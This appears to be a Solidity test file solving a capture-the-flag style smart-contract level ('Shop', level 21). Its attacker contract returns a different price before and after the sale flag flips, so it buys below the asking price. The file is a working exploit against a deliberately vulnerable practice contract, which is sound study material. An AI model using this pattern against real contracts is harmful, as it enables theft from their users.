// SPDX-License-Identifier: MIT
pragma solidity ^0.8.13;

import {BaseTest} from "./BaseTest.sol";
import {ShopFactory} from "../src/levels/21-ShopFactory.sol";
import {Shop, Buyer} from "../src/levels/21-Shop.sol";

contract Hustler is Buyer {
  function price() external view returns (uint256){
    if(Shop(msg.sender).isSold()) return 90;
    return 110;
  }

  function attack(Shop shop) external {
    shop.buy();
  }
}

contract ShopSolution is BaseTest {
    function solution(address payable target_) internal override{
        Shop target = Shop(target_);
        (new Hustler()).attack(target);
    }

    function construction() internal override returns(address payable ) {
        return payable(address(new ShopFactory()));
    }
}
